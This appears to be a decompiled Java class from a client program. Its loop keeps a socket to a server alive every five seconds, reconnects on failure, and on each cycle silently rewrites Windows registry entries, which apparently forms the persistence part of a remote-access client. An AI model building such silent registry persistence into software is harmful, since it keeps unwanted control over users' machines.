package carLambo;

final class SocketKeepAliveSender implements Runnable {
   public final void run() {
      while(ConnectionUtil.isConnectedWithServer) {
         try {
            ConnectionUtil.socketKeepAlive();

            try {
               ConnectionUtil.setWindowsRegisters();
            } catch (Exception var1) {
               ;
            }

            Thread.sleep(5000L);
         } catch (Exception var2) {
            ConnectionUtil.reconnectToSocket();
         }
      }

   }
}
